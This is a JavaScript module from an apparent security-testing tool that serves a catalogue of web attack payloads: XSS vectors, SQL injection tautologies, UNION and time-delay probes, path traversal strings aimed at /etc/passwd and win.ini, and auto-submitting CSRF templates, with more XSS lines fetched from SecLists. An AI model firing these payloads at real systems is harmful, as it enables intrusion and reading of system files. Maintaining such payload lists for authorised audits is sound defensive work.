// ═══════════════════════════════════════════════════════════════
//  SudoDeck Security Payload Service
// ═══════════════════════════════════════════════════════════════

import { payloadsData } from '../components/payloadsData.ts';

const ENRICHED_PAYLOADS = payloadsData.map(p => ({
  id: String(p.id),
  category: p.category,
  title: `${p.category} Vector #${p.id}`,
  payload: p.value,
  description: `${p.category} input validation & security audit testing probe.`,
  source: 'SecLists / PayloadAllTheThings'
}));

const FALLBACK_PAYLOADS = [
  // ── 1. XSS Validation Test Vectors ──────────────────────────────
  {
    id: 'xss-1',
    category: 'XSS',
    title: 'Basic Script Tag Alert',
    payload: "<script>alert('SudoDeck-Audit')</script>",
    description: 'Standard inline script execution test vector for HTML sanitization audits.',
    source: 'OWASP'
  },
  {
    id: 'xss-2',
    category: 'XSS',
    title: 'Image Error Handler',
    payload: "<img src=x onerror=alert('SudoDeck-Test')>",
    description: 'HTML attribute injection test via broken image tag onerror trigger.',
    source: 'SecLists'
  },
  {
    id: 'xss-3',
    category: 'XSS',
    title: 'SVG Inline Vector',
    payload: '<svg onload=alert(1)>',
    description: 'XML/SVG namespace script execution test vector.',
    source: 'SecLists'
  },
  {
    id: 'xss-4',
    category: 'XSS',
    title: 'JavaScript Protocol Link',
    payload: "javascript:alert('Audit')",
    description: 'URI scheme execution test for href and src validation filters.',
    source: 'OWASP'
  },
  {
    id: 'xss-5',
    category: 'XSS',
    title: 'Body OnLoad Attribute',
    payload: '<body onload=alert(1)>',
    description: 'Document body event handler execution vector.',
    source: 'SecLists'
  },
  {
    id: 'xss-6',
    category: 'XSS',
    title: 'Input Autofocus Vector',
    payload: '<input autofocus onfocus=alert(1)>',
    description: 'Autofocus-triggered DOM event test vector.',
    source: 'SecLists'
  },
  {
    id: 'xss-7',
    category: 'XSS',
    title: 'Iframe Source Script',
    payload: '<iframe src="javascript:alert(1)"></iframe>',
    description: 'Nested browsing context script evaluation probe.',
    source: 'SecLists'
  },
  {
    id: 'xss-8',
    category: 'XSS',
    title: 'Details Tag Toggle Trigger',
    payload: '<details open ontoggle=alert(1)>',
    description: 'HTML5 semantic element toggle event trigger.',
    source: 'SecLists'
  },

  // ── 2. SQL Injection Validation Test Vectors ────────────────────
  {
    id: 'sqli-1',
    category: 'SQLi',
    title: 'Classic Always-True OR Condition',
    payload: "' OR '1'='1",
    description: 'Boolean-based tautology test vector to audit parameterized queries.',
    source: 'SecLists'
  },
  {
    id: 'sqli-2',
    category: 'SQLi',
    title: 'Numeric OR Condition With Comment',
    payload: "1' OR 1=1 -- -",
    description: 'Integer parameter breakout with standard SQL line comment terminator.',
    source: 'SecLists'
  },
  {
    id: 'sqli-3',
    category: 'SQLi',
    title: 'Basic UNION SELECT Column Probe',
    payload: "' UNION SELECT NULL, NULL, NULL -- -",
    description: 'Column count enumeration vector for testing UNION-based query resilience.',
    source: 'OWASP'
  },
  {
    id: 'sqli-4',
    category: 'SQLi',
    title: 'Time-Based Sleep (MySQL)',
    payload: "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
    description: 'Time-based blind probe for detecting unparameterized database queries.',
    source: 'SecLists'
  },
  {
    id: 'sqli-5',
    category: 'SQLi',
    title: 'Time-Based Delay (PostgreSQL)',
    payload: "'; SELECT pg_sleep(5); --",
    description: 'PostgreSQL stacked query and sleep test vector.',
    source: 'OWASP'
  },
  {
    id: 'sqli-6',
    category: 'SQLi',
    title: 'Stacked Query Termination Probe',
    payload: "admin'--",
    description: 'Authentication bypass boundary test for legacy SQL lookups.',
    source: 'SecLists'
  },
  {
    id: 'sqli-7',
    category: 'SQLi',
    title: 'Numeric Tautology Without Quotes',
    payload: "1 OR 1=1",
    description: 'Unquoted integer parameter validation probe.',
    source: 'OWASP'
  },
  {
    id: 'sqli-8',
    category: 'SQLi',
    title: 'MSSQL Waitfor Delay Probe',
    payload: "1'; WAITFOR DELAY '0:0:5'--",
    description: 'MSSQL specific stacked time-delay test statement.',
    source: 'SecLists'
  },
  {
    id: 'sqli-custom-1',
    category: 'SQLi',
    title: 'Custom Database Parameter Validation Probe',
    payload: "' OR '1'='1' --",
    description: 'Custom database input validation and parameter boundary audit probe.',
    source: 'Custom Audit Repository'
  },
  // Oracle Database Audit Queries
  {
    id: 'sqli-ora-1',
    category: 'SQLi',
    title: 'Oracle Version Banner Inspection',
    payload: "SELECT banner FROM v$version;",
    description: 'Audit query to inspect database engine version in Oracle environments.',
    source: 'Oracle Audit Vectors'
  },
  {
    id: 'sqli-ora-2',
    category: 'SQLi',
    title: 'Oracle Current User Lookup',
    payload: "SELECT user FROM dual;",
    description: 'Audit query retrieving active session user via Oracle dual table.',
    source: 'Oracle Audit Vectors'
  },
  {
    id: 'sqli-ora-3',
    category: 'SQLi',
    title: 'Oracle Schema Tables Enumeration',
    payload: "SELECT table_name FROM all_tables;",
    description: 'Data dictionary query to verify table listing permissions.',
    source: 'Oracle Audit Vectors'
  },
  {
    id: 'sqli-ora-4',
    category: 'SQLi',
    title: 'Oracle Users Table Column Lookup',
    payload: "SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';",
    description: 'Column dictionary inspection query for users table verification.',
    source: 'Oracle Audit Vectors'
  },
  {
    id: 'sqli-ora-5',
    category: 'SQLi',
    title: 'Oracle PL/SQL Sleep Probe',
    payload: "BEGIN DBMS_LOCK.SLEEP(5); END;",
    description: 'Time-delay test statement using DBMS_LOCK package.',
    source: 'Oracle Audit Vectors'
  },
  {
    id: 'sqli-ora-6',
    category: 'SQLi',
    title: 'Oracle UNION DUAL Verification',
    payload: "' UNION SELECT NULL FROM DUAL--",
    description: 'Single-column UNION verification probe tailored for Oracle DUAL syntax.',
    source: 'Oracle Audit Vectors'
  },
  {
    id: 'sqli-ora-7',
    category: 'SQLi',
    title: 'Oracle Two-Column UNION DUAL Probe',
    payload: "' UNION SELECT NULL,NULL FROM DUAL--",
    description: 'Two-column UNION verification probe tailored for Oracle DUAL syntax.',
    source: 'Oracle Audit Vectors'
  },
  // SQLite Database Audit Queries
  {
    id: 'sqli-sqlite-1',
    category: 'SQLi',
    title: 'SQLite Version Function',
    payload: "SELECT sqlite_version();",
    description: 'Inspects installed SQLite library version.',
    source: 'SQLite Audit Vectors'
  },
  {
    id: 'sqli-sqlite-2',
    category: 'SQLi',
    title: 'SQLite Master Tables Lookup',
    payload: "SELECT name FROM sqlite_master WHERE type='table';",
    description: 'Enumerates defined database tables in SQLite master metadata.',
    source: 'SQLite Audit Vectors'
  },
  {
    id: 'sqli-sqlite-3',
    category: 'SQLi',
    title: 'SQLite PRAGMA Table Info Inspection',
    payload: "PRAGMA table_info('users');",
    description: 'Table definition and column data type inspection in SQLite.',
    source: 'SQLite Audit Vectors'
  },
  {
    id: 'sqli-sqlite-4',
    category: 'SQLi',
    title: 'SQLite Single Column UNION Probe',
    payload: "' UNION SELECT NULL--",
    description: 'Single-column UNION query reflection probe for SQLite.',
    source: 'SQLite Audit Vectors'
  },
  {
    id: 'sqli-sqlite-5',
    category: 'SQLi',
    title: 'SQLite Two-Column UNION Probe',
    payload: "' UNION SELECT NULL,NULL--",
    description: 'Two-column UNION query reflection probe for SQLite.',
    source: 'SQLite Audit Vectors'
  },
  // PostgreSQL Database Audit Queries
  {
    id: 'sqli-pg-1',
    category: 'SQLi',
    title: 'PostgreSQL Environment Inspection',
    payload: "SELECT version(), current_user, current_database();",
    description: 'Queries server release, connected username, and active catalog in PostgreSQL.',
    source: 'PostgreSQL Audit Vectors'
  },
  {
    id: 'sqli-pg-2',
    category: 'SQLi',
    title: 'PostgreSQL Catalog Public Tables Listing',
    payload: "SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname = 'public';",
    description: 'System catalog query retrieving all public schema table names.',
    source: 'PostgreSQL Audit Vectors'
  },
  {
    id: 'sqli-pg-3',
    category: 'SQLi',
    title: 'PostgreSQL Information Schema Column Lookup',
    payload: "SELECT column_name FROM information_schema.columns WHERE table_name = 'users';",
    description: 'ANSI standard information schema column query for PostgreSQL.',
    source: 'PostgreSQL Audit Vectors'
  },
  {
    id: 'sqli-pg-4',
    category: 'SQLi',
    title: 'PostgreSQL Blind Sleep Condition',
    payload: "' AND (SELECT 1 FROM (SELECT(pg_sleep(5)))a)--",
    description: 'Inline blind subquery test statement using pg_sleep function.',
    source: 'PostgreSQL Audit Vectors'
  },
  {
    id: 'sqli-pg-5',
    category: 'SQLi',
    title: 'PostgreSQL Basic Single Quote Breakout',
    payload: "'--",
    description: 'Standard literal string delimiter termination test vector.',
    source: 'SQL Injection Standards'
  },
  {
    id: 'sqli-pg-6',
    category: 'SQLi',
    title: 'PostgreSQL Double Quote Delimiter Breakout',
    payload: '"--',
    description: 'Identifier delimiter quotation test vector for PostgreSQL.',
    source: 'SQL Injection Standards'
  },
  {
    id: 'sqli-delim-1',
    category: 'SQLi',
    title: 'Single Quote Syntax Error Probe',
    payload: "'",
    description: 'Basic delimiter character injection to test input sanitization and database syntax error handling.',
    source: 'SQL Injection Standards'
  },
  {
    id: 'sqli-delim-2',
    category: 'SQLi',
    title: 'Double Quote Syntax Error Probe',
    payload: '"',
    description: 'Double quote delimiter character test for identifier and string parsing resilience.',
    source: 'SQL Injection Standards'
  },
  {
    id: 'sqli-taut-1',
    category: 'SQLi',
    title: 'Classic Tautology With Dash Comment',
    payload: "' OR 1=1--",
    description: 'Standard boolean tautology condition terminated with double-dash SQL comment.',
    source: 'SQL Injection Standards'
  },
  {
    id: 'sqli-pg-7',
    category: 'SQLi',
    title: 'PostgreSQL Direct Sleep Evaluation',
    payload: "SELECT pg_sleep(5);",
    description: 'Direct diagnostic query using pg_sleep for database response timing verification.',
    source: 'PostgreSQL Audit Vectors'
  },

  // ── 3. Directory Traversal Validation Test Vectors ──────────────
  {
    id: 'trav-1',
    category: 'Traversal',
    title: 'Unix Relative Path Traversal',
    payload: '../../../../etc/passwd',
    description: 'Canonical relative path traversal benchmark to audit file retrieval parameters.',
    source: 'OWASP / SecLists'
  },
  {
    id: 'trav-2',
    category: 'Traversal',
    title: 'Windows System INI Traversal',
    payload: '..\\..\\..\\..\\windows\\win.ini',
    description: 'Windows filesystem path separator traversal probe.',
    source: 'OWASP / SecLists'
  },
  {
    id: 'trav-3',
    category: 'Traversal',
    title: 'URL-Encoded Relative Traversal',
    payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    description: 'Standard single URL encoding test vector for path sanitizers.',
    source: 'SecLists'
  },
  {
    id: 'trav-4',
    category: 'Traversal',
    title: 'Double URL-Encoded Traversal',
    payload: '%252e%252e%252f%252e%252e%252fetc%252fpasswd',
    description: 'Tests recursive URL decoding vulnerabilities in reverse proxies.',
    source: 'SecLists'
  },
  {
    id: 'trav-5',
    category: 'Traversal',
    title: 'Nested Non-Recursive Filter Bypass',
    payload: '....//....//....//etc/passwd',
    description: 'Verifies whether path sanitizer performs safe recursive string stripping.',
    source: 'SecLists'
  },
  {
    id: 'trav-6',
    category: 'Traversal',
    title: 'Null Byte Truncation (Legacy)',
    payload: '../../../../etc/passwd%00.png',
    description: 'Audit vector for file extension whitelist enforcement against null termination.',
    source: 'OWASP'
  },
  {
    id: 'trav-7',
    category: 'Traversal',
    title: 'Absolute Linux System Path',
    payload: '/etc/hosts',
    description: 'Direct absolute path lookup test when root-relative lookup is unrestricted.',
    source: 'OWASP'
  },
  {
    id: 'trav-8',
    category: 'Traversal',
    title: 'Windows Alternate Data Streams (ADS)',
    payload: '..\\..\\..\\boot.ini::$DATA',
    description: 'NTFS alternate data stream suffix traversal audit vector.',
    source: 'SecLists'
  },

  // ── 4. CSRF Testing Templates & Tokens ──────────────────────────
  {
    id: 'csrf-1',
    category: 'CSRF',
    title: 'Auto-Submitting POST Form Template',
    payload: '<form action="https://target.local/api/update" method="POST"><input type="hidden" name="action" value="test" /><input type="submit" value="Submit" /></form><script>document.forms[0].submit();</script>',
    description: 'Classic zero-interaction cross-site form submission test template.',
    source: 'OWASP CSRF Guard'
  },
  {
    id: 'csrf-2',
    category: 'CSRF',
    title: 'Fetch API With Credentials Template',
    payload: "fetch('https://target.local/api/profile', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'status=audit_test' });",
    description: 'CORS & SameSite cookie attribute audit request probe.',
    source: 'PortSwigger Academy'
  },
  {
    id: 'csrf-3',
    category: 'CSRF',
    title: 'Image Tag GET Request Probe',
    payload: '<img src="https://target.local/account/logout" width="0" height="0" />',
    description: 'Audit template to test state-changing GET endpoints lacking CSRF tokens.',
    source: 'OWASP'
  },
  {
    id: 'csrf-4',
    category: 'CSRF',
    title: 'JSON POST via Beacon API',
    payload: 'navigator.sendBeacon("https://target.local/api/telemetry", JSON.stringify({ audit: true }));',
    description: 'Beacon API payload testing pre-flight and Origin validation policies.',
    source: 'MDN / Security Standard'
  }
];

let cache = null;
const CACHE_TTL = 1000 * 60 * 30; // 30 mins

export async function getPayloads(category = 'all', query = '') {
  const now = Date.now();
  let payloads = ENRICHED_PAYLOADS;

  if (cache && now - cache.lastFetched < CACHE_TTL) {
    payloads = cache.data;
  } else {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 3500);

      const externalUrl = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt';
      const res = await fetch(externalUrl, {
        signal: controller.signal,
        headers: { 'User-Agent': 'SudoDeck-Security-Manager/1.0' }
      });
      clearTimeout(timeoutId);

      if (res.ok) {
        const text = await res.text();
        const lines = text
          .split('\n')
          .map(l => l.trim())
          .filter(l => l.length > 5 && !l.startsWith('#'))
          .slice(0, 15);

        const dynamicXss = lines.map((line, idx) => ({
          id: `seclists-xss-${idx + 1}`,
          category: 'XSS',
          title: `SecLists Vector #${idx + 1}`,
          payload: line,
          description: 'Live synced input validation string from SecLists repository.',
          source: 'SecLists Live'
        }));

        payloads = [...ENRICHED_PAYLOADS, ...dynamicXss];
        cache = { data: payloads, lastFetched: now };
      }
    } catch {
      payloads = ENRICHED_PAYLOADS;
    }
  }

  let filtered = payloads;
  if (category && category !== 'all') {
    filtered = filtered.filter(p => p.category.toLowerCase() === category.toLowerCase());
  }

  if (query) {
    const q = query.toLowerCase().trim();
    filtered = filtered.filter(p =>
      p.title.toLowerCase().includes(q) ||
      p.payload.toLowerCase().includes(q) ||
      p.description.toLowerCase().includes(q) ||
      p.category.toLowerCase().includes(q)
    );
  }

  return {
    success: true,
    count: filtered.length,
    totalAvailable: payloads.length,
    categories: ['XSS', 'SQLi', 'Traversal', 'CSRF', 'Command'],
    timestamp: new Date().toISOString(),
    payloads: filtered
  };
}
